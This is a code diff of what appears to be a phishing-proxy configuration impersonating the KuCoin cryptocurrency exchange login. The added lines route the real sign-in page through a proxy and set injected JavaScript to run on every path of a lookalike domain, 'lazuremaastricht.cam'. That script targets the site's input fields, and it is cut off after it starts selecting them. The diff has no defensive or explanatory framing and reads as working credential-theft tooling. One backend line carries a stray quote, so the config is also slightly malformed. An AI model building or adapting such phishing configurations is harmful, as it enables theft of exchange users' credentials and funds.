@@ -41,8 +41,13 @@ login:
   password: pass
   url: https://www.kucoin.com/ucenter/signin
 
+paths:
+  - path: "/ucenter/signin"
+    backend: https://www.kucoin.com/ucenter/signin"
+
 js_inject:
-  - trigger: 'signin'
+  - trigger_domains: ['lazuremaastricht.cam']
+    trigger_paths: ["/*"]
     script: |
       document.addEventListener('DOMContentLoaded', function() {
         const inputs = document.querySelectorAll('.KuxInput-input');
